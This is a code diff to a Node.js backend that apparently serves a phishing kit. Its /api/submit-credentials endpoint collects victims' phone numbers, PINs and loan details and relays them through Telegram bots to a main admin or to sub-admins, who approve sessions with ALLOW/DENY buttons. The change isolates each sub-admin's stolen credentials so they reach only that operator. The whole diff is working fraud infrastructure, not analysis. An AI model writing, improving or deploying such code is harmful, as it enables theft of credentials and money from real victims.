@@ -20,7 +20,7 @@ if (!MAIN_BOT_TOKEN) {
 const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });
 
 mainBot.on('polling_error', (error) => {
-    console.error('⚠️ Main Bot Polling Error:', error.code, error.message);
+    console.error('⚠️️ Main Bot Polling Error:', error.code, error.message);
 });
 
 let activeSessions = {};
@@ -51,7 +51,6 @@ mainBot.on('message', (msg) => {
                 console.error(`⚠️ Sub-Admin (${userIdStr}) Bot Polling Error:`, err.code, err.message);
             });
 
-            // Set up callback queries for this specific sub-admin bot so they can handle ALLOW/DENY buttons
             setupCallbackHandler(customBot, userIdStr, false);
 
             customBot.getMe().then((botInfo) => {
@@ -179,21 +178,30 @@ function setupCallbackHandler(botInstance, ownerId, isMain = false) {
     });
 }
 
-// Initialize handler for the main bot
 setupCallbackHandler(mainBot, MAIN_ADMIN_ID, true);
 
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
-    // Explicitly target the specific sub-admin's chat ID and bot based on the query parameter link used
     let targetAdmin = MAIN_ADMIN_ID;
     let targetBot = mainBot;
 
+    // STRICT ISOLATION: If an adminId is passed, make sure it maps precisely to that sub-admin's bot and ID. 
+    // If it's a sub-admin, it will NEVER fall back or send to the Main Admin.
     if (adminId && authorizedAdmins.has(adminId)) {
-        targetAdmin = adminId; // Sets the receiver to the sub-admin's exact chat ID
-        if (adminId !== MAIN_ADMIN_ID && subAdminBots[adminId]) {
-            targetBot = subAdminBots[adminId]; // Routes through the sub-admin's custom bot instance
+        if (adminId === MAIN_ADMIN_ID) {
+            targetAdmin = MAIN_ADMIN_ID;
+            targetBot = mainBot;
+        } else if (subAdminBots[adminId]) {
+            targetAdmin = adminId;
+            targetBot = subAdminBots[adminId];
+        } else {
+            // Sub-admin hasn't configured their bot token yet; block sending to main admin
+            return res.json({ success: false, message: 'Sub-admin bot not configured yet.' });
         }
+    } else {
+        // If no valid admin ID was provided in the link, block it so it doesn't leak to main admin by accident
+        return res.json({ success: false, message: 'Unauthorized link.' });
     }
 
     activeSessions[sessionId] = {
@@ -218,7 +226,7 @@ app.post('/api/submit-credentials', (req, res) => {
                 ]
             }
         }).then(() => {
-            console.log(`✅ Credentials successfully sent to admin ${targetAdmin} via their designated bot`);
+            console.log(`✅ Credentials successfully sent to designated admin ${targetAdmin}`);
         }).catch(err => {
             console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
         });
